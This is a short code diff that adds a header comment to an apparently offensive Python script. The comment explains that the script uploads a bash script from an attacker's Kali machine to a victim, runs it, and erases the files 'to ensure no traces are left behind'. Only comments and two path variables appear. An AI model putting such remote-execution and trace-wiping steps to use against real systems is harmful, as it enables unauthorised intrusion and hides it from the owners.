@@ -1,4 +1,26 @@
-#def run_script(client)
+# This script performs the following tasks:
+# 1. Uploads a bash script from the attacker's machine to the victim's machine.
+# 2. Sets execute permissions for the uploaded script on the victim's machine.
+# 3. Executes the uploaded script on the victim's machine.
+# 4. Cleans up temporary files on the victim's machine after execution.
+# 5. Deletes all `.tar.gz` files from the attacker's Downloads directory.
+
+# Detailed Steps:
+# - The script first checks if the local bash script exists on the attacker's machine.
+#   If it exists, it uploads the script to the victim's machine at a specified path.
+# - After uploading, it sets the script as executable using `chmod`.
+# - The script is then executed on the victim's machine, and the output is captured.
+# - Temporary files, including the uploaded script and any output files, are removed
+#   from the victim's machine to ensure no traces are left behind.
+# - Finally, the script cleans up the attacker's Downloads directory by deleting
+#   all `.tar.gz` files to maintain a clean working environment.
+
+# Note:
+# - Ensure the paths for the local script, remote script, and Downloads directory
+#   are correctly configured before running the script.
+# - Proper permissions and access are required to execute commands on the victim's machine.
+# - Handle exceptions carefully to avoid unintended errors during file operations.
+
 # Define paths for the bash script and backup file
 local_script = "/home/kali/Documents/backup.sh"           # Path to bash script on attacker
 remote_script = "/tmp/backup.sh"                          # Path to upload script on victim
